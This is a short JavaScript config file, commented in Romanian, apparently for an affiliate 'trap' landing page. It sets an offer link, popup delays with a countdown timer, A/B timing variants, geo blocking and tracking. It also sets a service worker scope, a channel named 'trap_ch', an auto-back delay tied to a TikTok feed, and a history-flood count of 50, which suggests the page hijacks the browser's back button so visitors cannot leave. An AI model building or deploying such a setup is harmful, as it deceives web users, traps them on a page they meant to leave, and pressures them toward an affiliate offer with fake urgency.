// config/config.js — toate variabilele centralizate
// EDITEAZĂ DOAR ACEST FIȘIER pentru a schimba comportamentul

window.__CONFIG = {
  // --- OFFER ---
  OFFER_URL: 'RECO_AFFILIATE_LINK_AICI',

  // --- TIMING ---
  POPUP_DELAY_MS: 20000,       // delay până la popup (ms)
  AUTO_BACK_MS: 1000,          // delay auto-back pe tiktok feed (ms)
  POPUP_COUNTDOWN_S: 300,      // countdown în popup (secunde)

  // --- A/B TEST ---
  AB_ENABLED: true,
  AB_VARIANTS: [
    { delay: 15000, weight: 33 },
    { delay: 20000, weight: 34 },
    { delay: 25000, weight: 33 }
  ],

  // --- GEO ---
  GEO_ALLOWED: [],             // gol = toate țările permise; ex: ['RO','US','GB']
  GEO_BLOCKED: ['CN','RU'],    // țări blocate

  // --- FREQUENCY CAP ---
  FREQ_CAP_ENABLED: true,
  FREQ_CAP_HOURS: 24,          // nu mai arată popup la același UID timp de X ore

  // --- TRACKING ---
  TRACK_VISIT: true,
  TRACK_POPUP: true,
  TRACK_CLAIM: true,

  // --- CHANNELS ---
  BROADCAST_CHANNEL: 'trap_ch',
  SW_SCOPE: '/',
  POPUP_PATH: '/popup',

  // --- HISTORY ---
  HISTORY_FLOOD_COUNT: 50,
};
